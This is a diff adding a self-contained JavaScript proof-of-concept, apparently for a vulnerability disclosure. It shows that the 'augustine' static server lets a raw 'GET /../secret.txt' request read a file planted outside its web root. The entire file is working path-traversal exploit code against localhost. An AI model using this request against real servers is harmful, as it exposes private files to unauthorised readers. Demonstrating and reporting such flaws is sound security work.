@@ -1,0 +1,33 @@
+```javascript
+const path = require('path');
+const fs = require('fs');
+const net = require('net');
+const augustine = require('./node_modules/augustine');
+
+// Set up a "web root" directory and a secret file outside it
+const cwd = process.cwd();
+const publicDir = path.join(cwd, 'public_www');
+fs.mkdirSync(publicDir, { recursive: true });
+
+const secretPath = path.join(cwd, 'secret.txt');
+fs.writeFileSync(secretPath, 'TOP-SECRET-DATA-OUTSIDE-WEBROOT');
+
+// Serve from public_www, as an operator of this static server would
+process.chdir(publicDir);
+augustine.start(4321, 'localhost');
+
+setTimeout(() => {
+  // augustine takes req.url's pathname verbatim (no normalization/decoding)
+  // and passes it straight into fs.existsSync/fs.readFileSync, so a raw
+  // ".." segment in the request line escapes the web root.
+  const socket = net.connect(4321, 'localhost', () => {
+    socket.write('GET /../secret.txt HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n');
+  });
+  let raw = '';
+  socket.on('data', (c) => (raw += c));
+  socket.on('end', () => {
+    console.log(raw); // Response body contains TOP-SECRET-DATA-OUTSIDE-WEBROOT
+    process.exit(0);
+  });
+}, 300);
+```
